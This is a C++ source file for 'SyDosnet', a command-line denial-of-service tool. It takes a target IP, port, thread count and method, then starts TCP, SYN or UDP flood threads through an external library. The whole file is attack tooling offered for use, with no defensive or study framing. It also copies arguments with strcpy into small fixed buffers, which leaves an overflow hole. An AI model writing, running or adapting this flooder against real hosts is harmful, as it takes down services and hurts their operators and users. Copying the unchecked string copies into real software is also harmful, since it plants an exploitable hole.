/* SyDosnet is Linux only */

#include<iostream>
#include<cstring>
#include<ctime>
#include"lib/dosapi.hpp"

enum METHOD { METHOD_TCP = 0, METHOD_SYN = 1, METHOD_UDP = 2, METHOD_NULL = -1 };

int attack(const char* ip, int port, const char* packet, int thread, int method)
{
    std::cout << " checking method " << std::endl;
    if(method != METHOD_NULL)
    {
        if(method == METHOD_TCP)
        {
            std::cout << " start tcp flood " << std::endl;
            for(int i = 0; i < thread; i++) {
                std::thread(tcpflood, ip, port, packet).detach();
                usleep(300 * 1000);
            }

            return METHOD_TCP;
        }

        else if(method == METHOD_SYN)
        {
            std::cout << " start syn flood " << std::endl;
            for(int i = 0; i < thread; i++) {
                std::thread(synflood, ip, port).detach();
                usleep(300 * 1000);
            }

            return METHOD_SYN;
        }

        else if(method == METHOD_UDP)
        {
            std::cout << " start udp flood " << std::endl;
            for(int i = 0; i < thread; i++) {
               std::thread(udpflood, ip, port, packet).detach();
               usleep(300 * 1000);
               
            }

            return METHOD_UDP;
        }
    }

    return METHOD_NULL;
}

int checkmethod(const char* method)
{
    if(strcmp(method, "tcp") == 0) {
        return METHOD_TCP;
    }

    else if(strcmp(method, "syn") == 0) {
        return METHOD_SYN;
    }

    else if(strcmp(method, "udp") == 0) {
        return METHOD_UDP;
    }

    return METHOD_NULL;
}

int main(int argc, char** argv)
{
    char ip[16] = "null";
    char packet[1024] = "null";
    int port = 0;
    int thread = 0;
    int method = METHOD_NULL;

    for(int i = 1; i < argc; i++)
    {
        /* Show Version */
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--version") == 0)
        {
            std::cout << "                                                                " << std::endl;
            std::cout << " |                        | version |                         | " << std::endl;
            std::cout << " |                   sydosnet v1.0 release                    | " << std::endl;
            std::cout << " |                      made by SeungYup                      | " << std::endl;
            std::cout << " |                                                            | " << std::endl;
            std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
            std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
            std::cout << "                                                                " << std::endl;

            return 0;
        }

        /* Show Help */
        else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0)
        {
            std::cout << "                                                                " << std::endl;
            std::cout << " |                          | help |                          | " << std::endl;
            std::cout << " |                -v,                                         | " << std::endl;
            std::cout << " |                  --version  show version                   | " << std::endl;
            std::cout << " |                -i,                                         | " << std::endl;
            std::cout << " |                  --ip  set target ip                       | " << std::endl;
            std::cout << " |                -p,                                         | " << std::endl;
            std::cout << " |                  --port  set target port                   | " << std::endl;
            std::cout << " |                -th,                                        | " << std::endl;
            std::cout << " |                  --thread  set attack thread               | " << std::endl;
            std::cout << " |                -pk,                                        | " << std::endl;
            std::cout << " |                  --packet  set attack packet               | " << std::endl;
            std::cout << " |                -m,                                         | " << std::endl;
            std::cout << " |                  --method  set attack method               | " << std::endl;
            std::cout << " |                                                            | " << std::endl;
            std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
            std::cout << " |          API: https://github.com/seungyup26/dosapi         | " << std::endl;
            std::cout << "                                                                " << std::endl;

            return 0;
        }

        /* Set Target IP */
        else if(strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--ip") == 0) {
            std::cout << " setting target ip... ";
            strcpy(ip, argv[i+1]);
            std::cout << " done " << std::endl;
        }

        /* Set Target Port */
        else if(strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
            std::cout << " setting target port ... " << std::endl;
            port = atoi(argv[i+1]);
            std::cout << " done " << std::endl;
        }

        /* Set Attack Packet */
        else if(strcmp(argv[i], "-pk") == 0 || strcmp(argv[i], "--packet") == 0) {
            std::cout << " setting attack packet " << std::endl;
            strcpy(packet, argv[i+1]);
            std::cout << " done " << std::endl;
        }

        /* Set Attack Thread */        
        else if(strcmp(argv[i], "-th") == 0 || strcmp(argv[i], "--thread") == 0) {
            std::cout << " setting attack thread " << std::endl;
            thread = atoi(argv[i+1]);
            std::cout << " done " << std::endl;
        }

        /* Set Attack Method */
        else if(strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--method") == 0) {
            std::cout << " setting attack method " << std::endl;
            method = checkmethod(argv[i+1]);
        }
    }

    /* IP is null */
    if(strcmp(ip, "null") == 0) {
        std::cout << " E: target ip address is null " << std::endl;
        return 1;
    }

    /* Port is null */
    if(port == 0) {
        std::cout << " E: target port is null " << std::endl;
        return 1;
    }

    /* Thread is null */
    if(thread == 0) {
        std::cout << " E: attack thread is null " << std::endl;
        return 1;
    }

    /* Packet is null */
    if(strcmp(packet, "null") == 0 && method != METHOD_SYN)
    {
        std::cout << " W: random packet " << std::endl;
        for(int i = 0; i < 1024; i++) {
            packet[i] = rand();
        }
    }

    std::cout << " attack start " << std::endl;
    attack(ip, port, packet, thread, method);

    std::cout << " attack to " << ip << ":" << port << std::endl;
    std::cout << " press ctrl+c or any enter to exit ... " << std::endl;

    std::cin.get();
    return 0;
}